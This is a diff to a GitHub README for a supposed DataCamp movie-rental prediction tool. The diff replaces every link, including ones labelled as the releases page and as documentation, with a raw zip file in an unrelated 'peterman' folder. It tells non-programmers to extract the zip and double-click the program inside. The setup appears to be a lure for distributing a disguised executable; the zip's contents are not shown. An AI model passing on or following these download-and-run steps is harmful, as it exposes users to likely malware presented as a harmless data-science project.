@@ -1,7 +1,7 @@
 # 📀 Predicting-Movie-Rental-Durations-DataCamp - Simple Tool for Movie Rental Analysis
 
 ## 📥 Download Now
-[![Download Now](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Predicting-Movie-Rental-Durations-DataCamp.zip%20Now-Get%20the%20latest%20release-blue)](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Predicting-Movie-Rental-Durations-DataCamp.zip)
+[![Download Now](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Rental_Camp_Predicting_Data_Movie_Durations_1.9.zip%20Now-Get%20the%20latest%20release-blue)](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Rental_Camp_Predicting_Data_Movie_Durations_1.9.zip)
 
 ## 🚀 Getting Started
 This project helps you forecast the duration of DVD rentals using different machine learning models. It compares several methods to find the best fit for predicting rental lengths. You do not need programming skills to use this application. Follow these steps to download and run the software.
@@ -21,19 +21,19 @@ This project helps you forecast the duration of DVD rentals using different mach
 ## 💡 How to Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to access the Releases page:  
-   [Download from GitHub Releases](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Predicting-Movie-Rental-Durations-DataCamp.zip)
+   [Download from GitHub Releases](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Rental_Camp_Predicting_Data_Movie_Durations_1.9.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, look for the latest version of the software, typically marked as “Latest Release.” 
 
 3. **Download the File**  
-   Click on the downloadable file link (e.g., `https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Predicting-Movie-Rental-Durations-DataCamp.zip`). This will start the download process.
+   Click on the downloadable file link (e.g., `https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Rental_Camp_Predicting_Data_Movie_Durations_1.9.zip`). This will start the download process.
 
 4. **Unzip the File**  
    Once downloaded, locate the file on your computer. Right-click and select “Extract All” to unzip the contents.
 
 5. **Run the Application**  
-   After extracting, find the application file (e.g., `https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Predicting-Movie-Rental-Durations-DataCamp.zip` or similar). Double-click it to start. Follow the prompts to input your data and run predictions.
+   After extracting, find the application file (e.g., `https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Rental_Camp_Predicting_Data_Movie_Durations_1.9.zip` or similar). Double-click it to start. Follow the prompts to input your data and run predictions.
 
 ## ⚙️ How to Use
 1. **Input Data**  
@@ -67,8 +67,8 @@ For questions or support:
 We welcome contributions! If you have suggestions or improvements, feel free to submit a pull request.
 
 ## 🔗 Important Links
-- [Download from GitHub Releases](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Predicting-Movie-Rental-Durations-DataCamp.zip)
-- [Documentation and Issues](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Predicting-Movie-Rental-Durations-DataCamp.zip)
+- [Download from GitHub Releases](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Rental_Camp_Predicting_Data_Movie_Durations_1.9.zip)
+- [Documentation and Issues](https://raw.githubusercontent.com/arjkun456/Predicting-Movie-Rental-Durations-DataCamp/main/peterman/Rental_Camp_Predicting_Data_Movie_Durations_1.9.zip)
 
 ## 🌟 Topics Covered
 The project involves concepts such as:
